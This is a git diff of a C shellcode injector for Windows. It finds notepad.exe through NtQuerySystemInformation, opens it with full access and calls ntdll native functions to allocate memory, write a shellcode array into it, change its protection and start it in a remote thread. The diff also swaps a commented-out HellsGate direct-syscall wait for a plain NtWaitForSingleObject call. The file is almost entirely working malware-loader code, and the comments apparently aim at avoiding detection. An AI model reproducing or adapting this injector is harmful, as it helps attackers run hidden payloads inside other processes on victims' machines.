@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <stdio.h>
-#include <Tlhelp32.h>
 #include "syscall-func.h"
 
 /*
@@ -41,11 +40,12 @@ unsigned char shellcode[] = {
 };
 
 int main() {
-	HANDLE			hSnapShot = NULL;
 	HANDLE			hProcess = NULL;
-	PROCESSENTRY32	Proc = {
-					.dwSize = sizeof(PROCESSENTRY32)
-	};
+	ULONG							uReturnLen1 = NULL,
+									uReturnLen2 = NULL;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	NTSTATUS						STATUS = NULL;
+
 
 	PVOID	pShellcodeAddress = NULL;
 	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
@@ -54,28 +54,61 @@ int main() {
 	LPWSTR	szProcessName = L"notepad.exe";
 	HANDLE	hThread = NULL;
 
-	// Create process snapshot
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-	// Loop through each process in the snapshot
-	Process32First(hSnapShot, &Proc);
-	do {
-		// Compare process with one provided in argument
-		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
-			// Get handle of matching process
-			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
-		}
-		// Next process if not matching
-	} while (Process32Next(hSnapShot, &Proc));
-
 	// Get NTDLL.DLL module handle
 	HMODULE	hNtdll = GetModuleHandle(L"NTDLL.DLL");
 
 	// Get syscall address
+	fnNtQuerySystemInformation	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
 	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 	fnNtProtectVirtualMemory	pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	fnNtWriteVirtualMemory		pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 	fnNtCreateThreadEx			pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	fnNtWaitForSingleObject		pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+	//--------------------------------------------------------------------------------
+	// Getting Handle to Remote Process
+	
+	// First NtQuerySystemInformation call
+	// This will fail with STATUS_INFO_LENGTH_MISMATCH
+	// But it will provide information about how much memory to allocate (uReturnLen1)	
+	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);
+
+	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL) {
+		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
+		return FALSE;
+	}
+
+	// Second NtQuerySystemInformation call
+	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
+	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
+	if (STATUS != 0x0) {
+		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	// Loop through the processes
+	while (TRUE) {
+
+		// Debug - printing all processes
+		wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", SystemProcInfo->ImageName.Buffer, SystemProcInfo->UniqueProcessId);
+
+		// Check the process's name size
+		// Comparing the enumerated process name to the intended target process
+		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcessName) == 0) {
+			// Openning a handle to the target process and saving it, then breaking 
+			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			break;
+		}
+
+		// if NextEntryOffset is 0, we reached the end of the array
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		// moving to the next element in the array
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+	}
 
 	// Allocate memory in notepad.exe process using NtAllocateVirtualMemory syscall
 	// sPayloadSize is the payload's size (272 bytes)
@@ -92,12 +125,10 @@ int main() {
 	// Launch the shellcode in a new thread
 	pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, NULL, NULL, NULL, NULL, NULL);
 
-	// Wait for 1 seconds for the payload to run
-	/*LARGE_INTEGER Timeout;
+	// Wait for 1 second for the payload to run
+	LARGE_INTEGER Timeout;
 	Timeout.QuadPart = -10000000;
-	HellsGate(Table.NtWaitForSingleObject.wSystemCall);
-	STATUS = HellDescent(hThread, FALSE, &Timeout);
-	*/
+	pNtWaitForSingleObject(hThread, FALSE, &Timeout);
 
 	return 0;
 }
